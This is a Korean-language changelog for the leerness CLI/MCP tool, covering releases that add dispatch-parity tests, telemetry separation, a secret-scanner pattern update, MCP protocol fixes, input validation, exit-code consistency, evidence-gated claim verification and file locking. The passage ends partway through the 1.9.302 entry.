- 현재 일치성 **갭 0**(83 def 모두 case 보유, 고아 case 0) — 즉시 버그는 없음.
- 진짜 위험은 **미래 드리프트**: mcp-tools.js 에 def 추가하고 switch case 누락 시 런타임에 조용히 `Unknown tool` 반환(테스트 부재).
- 전면 이전(인라인 230줄, MCP critical 경로)은 low 우선순위 대비 이동 위험이 큼 → **위험을 먼저 가드**하고 이전은 후속(계획).

### 구현 (UR-0044 가드)
1. **selftest 일치성 가드**: 모든 도구 def 가 dispatch `case` 보유 + 고아 case 0 + 모든 def 의 `requiredTier` 가 유효 tier(8종). 미래 def/case 드리프트 즉시 검출.
2. **e2e 런타임 스모크**: `tools/list` 수 = def 수(83) + 대표 도구(about/commands/pulse) dispatch 가 `-32601`(Unknown) 아님.
3. selftest 66→67 · e2e 263→264.

### 검증
- **selftest 67/67 PASS** · **E2E 264/264 PASS** (회귀 0).
- 실측: 83 def ↔ 83 case 1:1 일치, 고아 0, tier 완비 · tools/list=83 · about/commands/pulse dispatch 정상.
- 범위: 일치성·tier 가드(위험 해소). 매핑의 tool-def 물리적 이전은 후속(가드가 안전망 제공).

## 1.9.318 — 2026-06-04 — UR-0025: HTML 파싱 유틸 모듈 분리 + 락 테스트 격리

**🧩 점진적 비파괴 모듈화(UR-0025) 한 단계 + pre-wake-audit critical 조사 결과 정리.**

### pre-wake-audit critical 조사 (요청)
매 라운드 관찰된 `pre-wake-audit critical 1` 을 조사 → **버그 아님**. `missing-user-requests` 가 미답 백로그 **3건**(UR-0025 모듈화 / UR-0044 ToolRegistry / UR-0053 JSON store)을 **정확히 보고**하는 정상 동작 (drift 마커와 달리 오발화 아님). 클리어하려면 백로그를 진행해야 함 → 가장 안전·확립된 UR-0025 를 진행.

### 구현 (UR-0025)
1. **순수 HTML 파싱 유틸 3종 → `lib/pure-utils.js` 분리**: `_htmlToText` / `_extractTitle` / `_extractLinks` (api-skill 문서 수집용, fs/네트워크 의존 0, URL·regex 만). harness.js 인라인 정의 제거 → require 로 동일 사용.
2. **락 테스트 격리(테스트 품질)**: B(1.9.303) 동시 task add 락 테스트가 전체 e2e 부하 + review-request 내부 spawn(~550ms×6) 오버헤드로 **타임아웃 플래키** → `--no-review` 로 동시성만 격리(락 로직은 격리 실행 0.4s/6 보존 검증). 제품 락 로직 변경 없음.
3. selftest 65→66 · e2e 262→263.

### 검증
- **selftest 66/66 PASS** · **E2E 263/263 PASS** (회귀 0).
- 실측: 모듈 `_htmlToText('<p>Hello <b>World</b></p>')` → `Hello World` · `_extractTitle`(엔티티 디코드) · `_extractLinks`(same-domain only) · harness 인라인 제거 확인 · api-skill 명령 정상 로드.

## 1.9.317 — 2026-06-04 — UR-0051: 텔레메트리 분리 (설치리뷰)

**📊 내부 auto-call 이 usage 통계를 오염시켜 거짓 skill 추천을 유발하던 결함 수정.**

### 배경 (설치리뷰)
"텔레메트리 오염 — 내부 auto-call 이 사용자명령 집계 → 거짓 skill 추천 + task add ~550ms". leerness 가 자기 자신을 spawn 하는 내부 auto-call(`task add` → `review-request`, MCP `callLeerness`, session close/handoff/drift 자동 보조 호출 등 ~20곳)이 dispatch 의 usage 카운터에 **사용자 명령처럼 집계** → `skill suggest`(명령 빈도 기반)가 거짓 후보 추천.

### 구현 (UR-0051)
1. **`LEERNESS_INTERNAL=1` 마커**: 모든 내부 self-spawn(`cp.spawnSync(process.execPath, [__filename, …])`)의 env 에 마킹 (~20곳). 공통 env 프래그먼트 일괄 적용 + env 없던 3곳(task add/session close 자동) 보강.
2. **usage 집계 가드**: dispatch 의 `_bumpUsage` 호출 조건에 `process.env.LEERNESS_INTERNAL !== '1'` 추가 — 내부 호출은 집계 제외.
3. selftest 64→65 · e2e 261→262.

### 검증
- **selftest 65/65 PASS** · **E2E 262/262 PASS** (회귀 0 — ~20곳 마킹에도 모든 auto-call 정상).
- 실측: `task add` 1회 → usage `{task:1}` (이전엔 `review-request` 도 집계) · 일반 drift 1→2 집계, **`LEERNESS_INTERNAL=1` drift → 미집계(2 유지)**.
- 범위: usage(skill 추천) 오염 제거. task add 지연(~550ms, review-request spawn 자체)은 별도 — 후속 캐싱/비동기화 검토 여지.

## 1.9.316 — 2026-06-04 — 🐛 drift 'session close 누락' 영구 오발화 버그 (자가 발견)

**🔧 session close 직후에도 drift 가 `session close 누락`(13일)을 보고하던 버그 수정 — 4라운드 연속 관찰된 leerness 자체 정확성 결함.**

### 근본 원인 (자가 발견)
- drift 의 `session close 누락` 신호는 `session-handoff.md` 의 `Last generated:` 타임스탬프로 나이를 계산.
- `sessionClose` 가 파일 재작성 시 프론트매터 보존 로직 `cur.indexOf('\n---\n', 4)` 가 **본문의 `---`(수평선/구분자)** 를 프론트매터 종료로 오인 → **구 블록 전체(구 `Last generated`)를 보존**하고 그 뒤에 새 블록을 append.
- 결과: `session-handoff.md` 에 `Last generated:` 가 **2개 누적**(구 + 신). drift 의 `.match()` 는 **첫(=구) 매치**를 읽어 → 매 session close 후에도 13일 stale → 영구 오발화.

### 구현 (2중 수정)
1. **근본 (write)**: 프론트매터는 파일이 **`^---` 로 시작할 때만** 추출 — 본문 `---` 오인 차단. 프론트매터 없으면 깨끗이 덮어써 단일 블록 유지(기존 손상 파일도 다음 close 에 self-heal).
2. **방어 (read)**: drift 가 `matchAll` 로 **최신(마지막) `Last generated`** 사용 — 혹시 모를 중복에도 freshest 반영.
3. selftest 63→64 · e2e 260→261.

### 검증
- **selftest 64/64 PASS** · **E2E 261/261 PASS** (회귀 0).
- 실측: 손상 파일(구 timestamp + 본문 `---`) → session close → `Last generated` **1개**(신선), drift `session close 누락` **age 0.00d 클리어** · 프론트매터 파일 3회 연속 close → 누적 0(프론트매터 보존).

## 1.9.315 — 2026-06-04 — UR-0054(부분): doc/surface 정합 + doctor 명령 (설치리뷰)

**📋 stale 현재상태 표시 수정 + `leerness doctor` 설치 진단 명령 추가 (Codex#2·Sonnet#2·Opus#2 공통 지적).**

### 배경 (설치리뷰)
"문서/표면 drift — init 'MCP 46'(실제83), .harness/.leerness 혼재, --help 중복, --compact 미압축, doctor no-op, init후 gate 실패". 6개 항목 중 **검증 후** 실제/현행 상태:
- ✅ **stale MCP 카운트**: `commands` 요약(하드코딩 65) + `_banner`(하드코딩 46) — 실제 83. 현재상태 주장이 stale.
- ✅ **doctor 부재**: `leerness doctor` 명령 없음(unknown command).
- ⏸ `--help 중복`/`--compact`: 현재 재현 안 됨(중복 0, --compact 200→185줄 압축 동작) — 이미 정상.
- ⏸ `init후 gate 실패`/`.harness·.leerness 혼재`: 의미적 결정/구조 변경 필요 → 후속(별도 라운드).

### 구현 (UR-0054 부분)
1. **stale MCP 카운트 → 동적 `_mcpToolCount()`**: `commands` 요약 + `_banner` 외부 AI 섹션. (역사적 changelog/What's-new 박스의 숫자는 그 시점 기록이라 보존.)
2. **`leerness doctor` 신규** — 설치/환경 1콜 진단: version·node·경로·MCP 수·**selftest 코어 무결성(N/N)**·셸/PowerShell. `--json` + 실패 시 exit 1(CI 친화). health(프로젝트)와 구분되는 "도구 자체" 진단.
3. selftest 62→63 · e2e 259→260.

### 검증
- **selftest 63/63 PASS** · **E2E 260/260 PASS** (회귀 0).
- 실측: `commands`/`_banner` → "MCP 83" · `doctor` → `version 1.9.315 · MCP 83 · selftest 63/63 · 셸` exit 0 · `doctor --json` 구조화 출력 · `about`/`pulse` mcpTools 이미 동적(확인).

## 1.9.314 — 2026-06-04 — UR-0052: PowerShell 감지 정확화 (설치리뷰)

**🪟 shell-guard 가 PowerShell 7(pwsh)을 cmd/ps5.1 로 오판해 `&&` 에 잘못된 ps5-chain 경고를 내던 결함 수정 (Opus#2 지적, Windows/한국어 타깃 핵심).**

### 배경 (설치리뷰)
- `_collectRuntimeEnv` 가 항상 `powershell.exe`(=Windows PowerShell 5.1)만 probe → pwsh7 환경도 버전 `5` 로 오판.
- `_detectShellCtx` 가 Windows `ComSpec`(항상 cmd.exe)에 의존 → pwsh7/ps5.1 도 `cmd` 로 오판.
- 결과: pwsh7(=`&&`/`||` 지원)에서 `a && b` 에 **거짓 ps5-chain 에러**(exit 1) 발생 가능.

### 구현 (UR-0052)
1. **`_detectPwshFromEnv(e)` 순수 헬퍼** — pwsh 6/7 신뢰 마커로 판별: `POWERSHELL_DISTRIBUTION_CHANNEL`(pwsh 런타임 전용, cmd/ps5 미상속) · pwsh 전용 경로(`\PowerShell\7\`, `Documents\PowerShell\`). pwsh 오검출은 안전(pwsh 는 `&&` 지원 → ps5-chain 무발생).
2. **ps5.1 자동 판별 안 함** — `Documents\WindowsPowerShell` 은 영구 user env(bash/cmd 도 상속)라 신뢰 불가 → **과경고 방지**. ps5-chain 규칙은 ctx 가 명시적 powershell+v5 일 때만(직접 호출/probe) 발화.
3. `_collectRuntimeEnv`/`_detectShellCtx` 둘 다 헬퍼 사용 + cross-platform psVersion 폴백 + `psEdition` 필드 추가.
4. selftest 61→62 · e2e 258→259.

### 검증
- **selftest 62/62 PASS** · **E2E 259/259 PASS** (회귀 0).
- 실측: pwsh7(channel) → `shell=powershell, psVersion=7, ps5-chain 없음` · 영구 ps5.1경로+bash → `shell=bash, ps5-chain 없음`(과경고 0) · 직접 `{powershell, v5}` → ps5-chain 발화(규칙 보존).
- 회귀 수정: B(1.9.304) 가 OLD 오판(shell=cmd)에 의존하던 `shell-guard "a && b"` exit 0 가정 → 정확 감지 후에도 통과(이 환경은 bash).

## 1.9.313 — 2026-06-04 — UR-0049: MCP notification 프로토콜 준수 (설치리뷰 3중수렴 high)

**🔌 MCP 서버가 JSON-RPC notification(`notifications/*`)에 에러 응답을 보내 프로토콜을 위반하던 결함 수정 — 엄격한 MCP 클라이언트의 핸드셰이크 중단 위험.**

### 배경 (설치리뷰)
실측: `notifications/initialized`(MCP 핸드셰이크 표준, id 없음) 전송 시 서버가 `{"jsonrpc":"2.0","error":{"code":-32601,"message":"Unknown method: notifications/initialized"}}` 응답.
- JSON-RPC 2.0 spec: **"The Server MUST NOT reply to a Notification"** (id 없는 요청). 응답 자체가 위반.
- 응답에 `id` 필드도 없어(undefined) 이중 위반 — 엄격한 클라이언트는 프로토콜 오류로 로깅/연결 중단 가능.
- 표준 `ping` 메서드도 `-32601` 오류 반환(빈 결과 `{}` 기대).

### 구현 (UR-0049)
1. **notification 가드**: `handleRequest` 진입부에서 `id` 없는 요청 또는 `notifications/*` 메서드 → **무응답**(spec 준수). `notifications/initialized`·`notifications/cancelled`·`notifications/progress` 등 조용히 수용.
2. **`ping` 표준 응답**: 빈 결과 `{}` 반환 (연결 확인).
3. 미지 메서드(id 있음)는 여전히 `-32601` 반환 — 정상 동작 보존.
4. selftest 60→61 · e2e 257→258.

### 검증
- **selftest 61/61 PASS** · **E2E 258/258 PASS** (회귀 0).
- 실측: `notifications/initialized`·`notifications/cancelled` → 무응답 · `ping`(id 2) → `{"result":{}}` · `initialize`/`tools/list` 정상 · `bogus/method`(id 有) → `-32601`(보존) · 핸드셰이크 시퀀스에서 응답 수 = id 보유 요청 수.

## 1.9.312 — 2026-06-04 — UR-0050: secret 스캐너 현대 키 패턴 (설치리뷰 3중수렴 high)

**🔒 `scan secrets` 가 modern OpenAI/Anthropic 키를 놓치던 보안 결함 수정 — 노출돼도 탐지 안 되던 위험.**

### 배경 (설치리뷰)
실측: 가짜 키 7종 스캔 시 **legacy `sk-...` 1건만 검출**, 나머지 전부 통과 —
- `sk-proj-...`/`sk-svcacct-...` (modern OpenAI 프로젝트/서비스 키): 기존 패턴 `sk-[A-Za-z0-9]{32,}` 이 **하이픈에서 끊겨** 미검출.
- `sk-ant-api03-..._...` (실제 Anthropic 키): 기존 `sk-ant-[A-Za-z0-9-]{20,}\b` 가 **언더스코어 미포함 + 후행 `\b`** 로 실제 키(언더스코어 사용)를 미검출.
- `gho_`/`ghu_`/`ghs_`/`ghr_` (GitHub PAT 외 변종), Stripe, npm, Google OAuth, AWS 임시(ASIA): 패턴 부재.

### 구현 (UR-0050)
`SECRET_PATTERNS` 9종 → 13종 확장:
1. **OpenAI modern** `sk-(proj|svcacct|admin)-[A-Za-z0-9_-]{20,}` (신규) + legacy 유지.
2. **Anthropic** 패턴 `_` 포함 + 후행 `\b` 제거 — 실제 `sk-ant-api03-` 키 호환.
3. **GitHub** `gh[pousr]_` 통합 (ghp_/gho_/ghu_/ghs_/ghr_).
4. **신규**: Stripe(`sk_|rk_(live|test)_`), npm(`npm_`), Google OAuth(`ya29.`), AWS 임시(`ASIA`).
5. selftest 59→60 · e2e 256→257.

### 검증
- **selftest 60/60 PASS** · **E2E 257/257 PASS** (회귀 0).
- 실측: 7종 키 모두 검출 + exit 1 · clean dir → exit 0(오탐 0) · **repo 자체 `scan secrets .` clean**(self-flag 없음).
- false-positive 가드: `userName`/URL 등 평범한 문자열 미검출.

## 1.9.311 — 2026-06-04 — UR-0047: init 가드 (설치리뷰 3중수렴 high)

**🛡 미초기화 디렉토리에서 write 명령이 부분 `.harness`(progress-tracker·cache·runs)만 생성해 "반쪽 설치" 상태를 만들던 결함 수정.**

### 배경 (설치리뷰)
실측: 깨끗한(미초기화) 폴더에서 `leerness task add` 가 곧바로 `.harness/{cache,progress-tracker.md,runs}` 를 생성 — `init` 없이 banner/handoff/doctor 가 혼란스러운 반쪽 상태로 동작. "write 진입점이 init 여부를 확인하지 않는다"(Codex#2·Sonnet#2·Opus#2 공통).

### 구현 (UR-0047)
1. **`_isInitialized(root)` — 워크스페이스-인식 판별**: 활성 워크스페이스(`.harness` 기본 / 마이그레이션 시 `.leerness`)의 강마커(`HARNESS_VERSION`/`guideline.md`) 또는 루트 `AGENTS.md` 중 하나라도 있으면 초기화로 간주(fail-open, 레거시·마이그레이션 호환).
2. **`_requireInit(root, cmd)` 가드**를 `.harness` write 7종 진입점에 적용 — **task add / task update / plan add / decision add / rule add / lesson save / brief set**. 미초기화 시 `fail`(exit 1) + `leerness init .` 안내, **`--force` 우회**.
3. **state(`.leerness` substrate)는 가드 제외** — start→record→verify→handoff 는 standalone 설계라 `.harness` init 과 무관(회귀 방지).
4. selftest 58→59 · e2e 255→256.

### 검증
- **selftest 59/59 PASS** · **E2E 256/256 PASS** (회귀 0).
- 실측: 미초기화 `task add` → exit 1 + `.harness` 미생성 · 7종 write 모두 차단 · `task add --force` → 0(우회) · init 후 7종 모두 → 0 · 레거시(HARNESS_VERSION 없이 AGENTS.md만) → 통과 · `state start`(미초기화) → 0(`.leerness` 만 생성).
- 범위: `.harness` 메모리/계획 write 진입점. read/show/list·state·init·migrate 는 비대상.

## 1.9.310 — 2026-06-04 — UR-0046: CLI/MCP 입력 스키마 검증 (설치리뷰 3중수렴 high)

**🛡 무효한 task status / rule trigger 가 그대로 등록돼 상태·정책 신뢰성을 훼손하던 결함 수정 — 세 모델(Codex#2·Sonnet#2) 공통 지적.**

### 배경 (설치리뷰)
실측: `task update --status nonsense` 가 그대로 적용(health 도 정상으로 보고), `rule add --trigger not-a-trigger` 가 경고만 하고 등록. "운영 레이어의 핵심인 상태/정책 신뢰성이 깨짐"(Codex). 게다가 기존 `validTriggers` 가 **every-round 누락**(R-0001 이 실제 사용 중) — warn-and-register 라 통과됐지만 불완전.

### 구현 (UR-0046)
1. **`TASK_STATUSES`(11종) / `RULE_TRIGGERS`(7종, every-round 포함) 모듈 상수 + `_validateChoice` 헬퍼** — 무효값은 `fail`(exit 1) + 유효값 안내, `--force` 우회.
2. **task add/update + plan add: `--status` 검증** — 무효 status 거부(이전 무검증).
3. **rule add: `--trigger` 검증** — warn-and-register → **거부**(exit 1). every-round 를 RULE_TRIGGERS 에 포함해 R-0001(every-round) 등록 보존.
4. selftest 57→58 · e2e 254→255.

### 검증
- **selftest 58/58 PASS** · **E2E 255/255 PASS** (회귀 0).
- 실측: `task --status nonsense` → exit 1 · `--status in-progress` → 0 · `--status weird --force` → 0(우회) · `rule --trigger 오타` → exit 1 · `--trigger every-round` → 0(**R-0001 보존**) · `--trigger every-update` → 0.
- 범위: status/trigger enum 검증. decision/기타 스키마는 후속.

## 1.9.309 — 2026-06-04 — UR-0048: verify-claim 거짓완료 차단 기본화 (설치리뷰 Opus critical)

**🔴 제품 핵심 가치(거짓완료 차단)가 기본값·MCP 에서 무력하던 자기모순 수정 — 증거 0 인 done 주장이 기본 통과하고 MCP 로는 강한 게이트에 도달조차 못 하던 critical 결함 해소.**

### 배경 (clean-install 리뷰 Opus G-1, 직접 재확인)
`verify-claim` 의 1번 셀링포인트인데, 증거 0 done 이 **기본 exit 0**(`fileChecks.every([])` 공허참 + `--require-evidence` 가 기본 OFF). MCP `leerness_verify_claim` 은 `requireEvidence` 미노출 → 외부 에이전트가 강한 게이트 **호출 불가**. `lazy detect` 는 잡는데 verify-claim 은 통과시키는 자기모순.

### 구현 (UR-0048)
1. **done/완료 주장 evidence 기본 강제** — `mustHaveEvidence = !--lenient && (done주장 || --require-evidence)`. 증거(파일·테스트·로그) 한 줄도 없는 done 은 기본 **FAIL(exit 1)**. CLI/json/MCP **세 경로 모두** 적용(이전엔 pretty 만, 그것도 플래그 시에만).
2. **비례적 임계** — 기본은 "근거 일부(파일·테스트·로그 중 하나)"만 요구(Opus 의 증거0 케이스만 차단, 과탐 방지). `--require-evidence`(명시)는 엄격(파일+테스트, 1.9.287). `--lenient` opt-out.
3. **MCP `leerness_verify_claim`** — done 기본 강제로 강한 게이트가 자동 도달 + `lenient` 인자 노출. json `verdict.evidenceComplete` + `evidence{required,...}` 추가.
4. selftest 56→57 · e2e 253→254 (FILE_RE 추출 테스트 2건은 `--lenient` 로 게이트와 분리).

### 검증
- **selftest 57/57 PASS** · **E2E 254/254 PASS** (회귀 0).
- 실측: 증거0 done → **exit 1**(CLI) + **isError**(MCP) · `--lenient` → exit 0 · 증거+파일존재 done → exit 0(회귀 0) · 비-done(requested) → 강제 안 함.
- 행동 변경 안전 처리: 비례 임계로 과탐 방지 + `--lenient` opt-out + 기존 파일추출 테스트 2건 분리.

## 1.9.308 — 2026-06-04 — UR-0055 (2단계 완료): 개발 방향 이력 + context/MCP 청사진 통합

**📘 프로젝트 청사진 기능 완성 — 개발 방향 변경/확대 이력 누적 + 에이전트가 청사진을 1콜로 회수(context/MCP). 사용자 요청 "개발 방향이 변경/확대될 때 업데이트" 완전 충족.**

### 구현 (UR-0055 2단계)
1. **`leerness brief update --direction "..."`** — 개발 방향 변경/확대를 날짜별 이력으로 누적(`## Direction History` append-only). README `**최근 개발 방향 변경**`(최근 3건) + blueprint export `개발 방향 이력` 섹션에 반영 → 프로젝트 진화 추적.
2. **context 청사진 통합** — `contextCmd` 가 `_loadBrief` 단일출처로 intent + brief 요약(intro/features/최근방향) 노출. 에이전트가 작업 시작 시 프로젝트 정체성을 1콜로 파악.
3. **MCP `leerness_brief` (83번째 도구, read-only)** — `{ path?, export? }` → 구조화 청사진(show) 또는 복사용 blueprint(export). 외부 에이전트가 "이 프로젝트가 무엇이고 어디로 가는가" 회수.
4. selftest 55→56 · e2e 252→253.

### 검증
- **selftest 56/56 PASS** · **E2E 253/253 PASS** (회귀 0).
- 실측: `brief update --direction` ×2 → Direction History 2건 누적 + README 최근방향 + export 이력 · `context --json` brief.latestDirection 노출 · MCP leerness_brief 가 directionHistory/features 반환.

### 🎉 UR-0055 완료 (사용자 명시 — 프로젝트 청사진)
- 1단계(1.9.307): brief set/show/export + README 개요 섹션
- 2단계(1.9.308): update --direction 이력 + context/MCP 통합
- 결과: 프로젝트 개요/소개/목적/기능을 README 에 유지·업데이트 + 복사하면 신규 프로젝트를 기초부터 재시작할 수 있는 blueprint.

## 1.9.307 — 2026-06-04 — UR-0055 (1단계): 프로젝트 청사진 brief (README 개요 + 복사용 blueprint)

**📘 사용자 명시 — 프로젝트 개요/소개/목적/기능을 README 에 작성·유지하고, 그 내용만 복사하면 신규 프로젝트를 기초부터 재시작할 수 있는 자기완결 청사진(blueprint) 생성. 기존 `.harness/project-brief.md` 비파괴 확장.**

### 배경 (사용자 명시)
"개발 중인 프로그램/프로젝트의 소개·목적·설명을 README 에 쓰고, 개발 방향 변경/확대 시 업데이트, 복사하면 신규 프로젝트 계획으로 쓸 수 있게(기초부터 재시작)". 기존 project-brief.md(Project/Purpose/Users/Success)는 빈약 → 10필드로 확장 + README 동기화 + export.

### 구현 (UR-0055 1단계)
1. **`.harness/project-brief.md` 10필드 확장** — intro/purpose/problem/features/stack/architecture/users/success/nonGoals/currentState (`## Section` 블록, 파서/직렬화, frontmatter 보존, 비파괴).
2. **`leerness brief set --intro/--purpose/--features/--stack/...`** — 정본 갱신 + README `## 프로젝트 개요` 관리 섹션(`<!-- leerness:project-brief:start/end -->`) 자동 동기화. **멱등 업데이트**(주어진 필드만 갱신, 나머지 보존 → 개발 방향 변경/확대 반영).
3. **`leerness brief show [--json]`** — 채움 현황(N/10) + 필드 표시.
4. **`leerness brief export [--out plan.md]`** — 자기완결 blueprint(소개+목적+문제+기능+아키텍처+스택+성공기준+비목표+현재상태 + "신규 프로젝트 시작 가이드") → 복사하면 기초부터 재시작 가능.
5. selftest 54→55 · e2e 251→252.

### 검증
- **selftest 55/55 PASS** · **E2E 252/252 PASS** (회귀 0).
- 실측: `brief set` → project-brief.md(## Intro/Features) + README 개요 섹션 동기화 · 멱등 업데이트(--purpose 만 갱신 시 intro/features 보존) · README 섹션 중복 0(재sync) · `brief export` blueprint(방향 변경 반영 + 신규프로젝트 가이드).

### 남은 부분 (UR-0055 2단계)
- `brief update --direction "..."`(개발 방향 변경 이력 누적) + handoff/context 청사진 노출 확장 + MCP `leerness_brief` 도구.

## 1.9.306 — 2026-06-04 — UR-0045: exit code 일관성 (설치리뷰 3중수렴 high)

**🚦 clean-install 리뷰에서 Codex·Sonnet·Opus 가 공통 high 로 지적한 "실패가 exit 0" 문제 수정 — CI·MCP·AI 에이전트가 실패를 성공으로 오판하던 근본 신뢰 결함. (직전 라운드의 인식론적 정직성과 직결: 에이전트가 거짓 성공을 믿지 않게.)**

### 배경 (Codex#1 · Sonnet#1 · Opus)
설치 후 실측: `leerness unknowncmd`/`decision add`(인자 누락)/`task badsubcmd` 가 오류 메시지를 내면서도 **exit 0** 반환. 원인: `fail(s)` 가 `✗ s` 로그만 하고 exit code 미설정(243개 호출 전부), unknown 명령은 help 로 fall-through. CI/스크립트/MCP/에이전트가 실패를 성공으로 오인.

### 구현 (UR-0045)
1. **`fail()` → `process.exitCode = 1`** — 243개 모든 오류 경로가 실패 신호. `process.exit` 즉시종료가 아니라 exitCode 설정(후속 출력/정리 보존, main 종료 wrapper 가 강제). 비치명 경고는 기존 `warn()` 유지.
2. **unknown 명령 fall-through** — 명시적 `help`/`commands`/`--help` 는 exit 0(의도), 그 외 미인식 명령은 `✗ 알 수 없는 명령: <cmd>` 안내 + exit 1. unknown 서브커맨드(task badsubcmd 등)도 fall-through → exit 1.
3. selftest 53→54 · e2e 250→251.

### 검증
- **selftest 54/54 PASS** · **E2E 251/251 PASS** (회귀 0).
- **fail() 변경 회귀 0 실증**: 251개 e2e 중 정상 종료해야 할 명령(status/task list/verify/audit/context/about/handoff/selftest…) 전부 exit 0 유지. 오류 경로(unknown/인자누락/badsub) exit 1, --help/--version exit 0.
- 범위: 입력값 스키마 검증(rule trigger/task status 등 무효값 거부)은 UR-0046(별도), 이번은 exit code 신호 일관성에 집중.

## 1.9.305 — 2026-06-04 — honesty-check: AI 인식론적 정직성 점검 (사용자 명시)

**🧠 사용자 요청 — AI 가 (1) 모르는 걸 아는 척, (2) 정보를 안 모으고, (3) 검증 없이 섣부르게 판단하는지를 점검하는 인식론적 정직성 가드 신설.**

### 배경 (사용자 명시)
"AI 가 모르는 정보를 아는 척하지 않는지 / 모르는 정보를 알기 위해 정확한 정보를 수집하는지 / 수집 후 검증 없이 섣부른 판단을 하지 않는지" 점검 요청. 기존 leerness 는 부분 커버만: `optimism-check`(행동 주장 vs 코드 흔적, 11종), `api-skill`(외부 문서 수집, opt-in), `verify-claim`(검증). **3차원을 통합 점검하는 정직성 가드는 없었음.**

### 구현
1. **`_epistemicHonestyCheck(text)`** (lib/analyzers.js, 순수) — 3차원 휴리스틱:
   - **pretend-knowledge**(high) — 단정 표현(반드시/항상/100%/always…)인데 근거·출처(파일/문서/테스트/로그) 없음
   - **premature-judgment**(high) — 추정 표현(아마/추정/probably/should…) + 완료·성공 결론인데 검증 근거 없음
   - **no-info-gathering**(med) — 외부 API/버전/스펙 언급인데 수집 흔적(공식문서/api-skill/조회) 없음 (파일경로 `api.js` 오탐 제외)
2. **`leerness honesty-check <T-ID> | --text "<주장>"`** — 양호 시 exit 0, high 발견 시 exit 1(에이전트 self-gate). `--json`.
3. **MCP `leerness_honesty_check` (82번째 도구, read-only)** — 에이전트가 단언 전 자기 주장 self-check.
4. **`verify-claim --strict-claims` 통합** — high-severity 정직성 발견도 strict 실패에 반영(낙관 + 정직성 통합 게이트).
5. selftest 52→53 · e2e 249→250.

### 검증
- **selftest 53/53 PASS** · **E2E 250/250 PASS** (회귀 0).
- 실측: "이 기능은 항상 동작"→pretend-knowledge(exit1), "아마 될 것 같다. 완료"→premature-judgment, "이 API rate limit 초당 5회"→no-info-gathering, "src/api.js 수정 12/12 통과(Exit:0)"→양호(exit0). 오탐 0(6/6 케이스).
- 휴리스틱 advisory — 근거(파일·문서·테스트·로그)나 수집 흔적(공식문서·api-skill·조회) 명시 시 해소.

## 1.9.304 — 2026-06-04 — UR-0025 (6단계): 순수 분석/검증 함수 → lib/analyzers.js 모듈 분리

**🧩 모놀리스 분리 계속 — 순수 분석/검증 함수 4종을 비파괴 분리. lib 6모듈 체제(630줄 외부화).**

### 배경
외부 리뷰 핵심(UR-0038~0043) 완료 후, 두 리뷰 공통 지적인 단일 대형 파일을 계속 점진 분리. 데이터 카탈로그(1~5단계) 다음으로 **순수 함수**(부작용 0, 입력→출력) 클러스터를 분리.

### 구현 (UR-0025 6단계)
1. **`lib/analyzers.js` 신설** — 순수 분석/검증 함수 4종(62줄):
   - `_evidenceQuality`(evidence 완전성: 파일/테스트/로그 근거)
   - `_parseEvidenceStats`(review-evidence pass/fail 집계)
   - `_shellGuardAnalyze`(셸 호환성 6규칙 정적 분석)
   - `_claimFileInGit`(verify-claim git 교차검증 매칭)
2. **비파괴 require-based 분리** — verify-claim/shell-guard/review-evidence 소비처는 동일 바인딩. 모두 순수(내부 의존 0) 검증.
3. **harness.js 21686→21630줄**. lib 6모듈: pure-utils+agent-registry+role-catalog+catalogs+mcp-tools+analyzers = 630줄 외부화.
4. selftest 51→52 (4함수 동일참조 단일출처 + 인라인 제거) · e2e 248→249 (모듈 standalone + shell-guard 동작 회귀).

### 검증
- **selftest 52/52 PASS** · **E2E 249/249 PASS** (회귀 0).
- 기존 selftest(_evidenceQuality/_parseEvidenceStats/_shellGuardAnalyze ×2/_claimFileInGit)가 추출 정합성 즉시 검증.
- `shell-guard "a && b" --json` 정상 동작(모듈 분리 후 회귀 없음).

## 1.9.303 — 2026-06-04 — UR-0043: 상태 파일 lost-update 락 (외부 AI 리뷰 — 멀티에이전트 안전 완성)

**🔐 원자적 쓰기(UR-0038)가 막지 못한 동시 read-modify-write lost-update를 advisory 락으로 차단. Codex/Opus가 지적한 "상태 쓰기에 락 0건" 해소 — 멀티에이전트 동시 쓰기 안전성 완성.**

### 배경 (Codex / Opus A-3)
원자적 쓰기는 부분쓰기 손상은 막으나, 두 에이전트가 동시에 `task add`(또는 `state record`)를 호출하면: A 읽기 → B 읽기 → A 쓰기 → B 쓰기(A 변경 누락) = **lost-update**. 특히 `nextId`(다음 ID 계산)가 쓰기와 분리돼 **동일 ID 충돌**(둘 다 같은 T-XXXX → 덮어쓰기)까지 발생. grep 결과 `flock`/`O_EXCL` 0건(Opus).

### 구현 (UR-0043)
1. **`_withLock(targetPath, fn)`** — `O_EXCL`(wx) 원자적 lock 파일로 상호배제. 점증 backoff 재시도, stale(crash) 30s 초과 시 탈취, 타임아웃 5s 시 락 없이 진행(원자쓰기로 손상은 이미 방지). **프로세스 내 재진입**(`_heldLocks`)으로 중첩 호출 데드락 방지.
2. **`_updateRun(root, id, mutator)`** — run 레코드 RMW를 락으로 캡슐화.
3. **적용** — `upsertProgress`(task/plan write), `taskAdd`/`planAdd`(nextId+upsert를 **하나의 락**으로 → ID 충돌 차단), `state record/verify/handoff`(_updateRun). `_sleepSyncMs`(Atomics.wait) 헬퍼.
4. selftest 50→51 · e2e 247→248.

### 검증
- **selftest 51/51 PASS** · **E2E 248/248 PASS** (회귀 0).
- **실측: 6개 `task add` 병렬 실행 → 6개 모두 보존 + ID 충돌 0 + 구분자 1줄**. (락 전: 3/6 보존, ID 충돌 발생 — 동일 ID 덮어쓰기 확인 후 수정.)

### 🎉 외부 AI 리뷰 신뢰성/보안 핵심 권고 완수
- UR-0038 원자쓰기 · UR-0039 시크릿차단 · UR-0040 셸주입 · UR-0041 정책 메타데이터 · UR-0042 verify 시맨틱 · **UR-0043 lost-update 락** — 세 모델(Codex/Sonnet/Opus) 공통 high + 전략 항목 전부 코드화. 남은 UR-0044(handler 통합)는 low.

## 1.9.302 — 2026-06-04 — UR-0042: verify-claim git diff 시맨틱 교차검증 (외부 AI 리뷰 R3, Opus G-1)

**🔍 Opus가 "가장 전략적 약점"으로 꼽은 거짓완료 검증의 실질화 — "파일 존재 + N passed" 문자열매칭에 git diff 교차검증 추가: 주장한 파일이 실제로 변경됐는가를 git working tree + 직전 커밋으로 대조.**

### 배경 (Opus G-1)
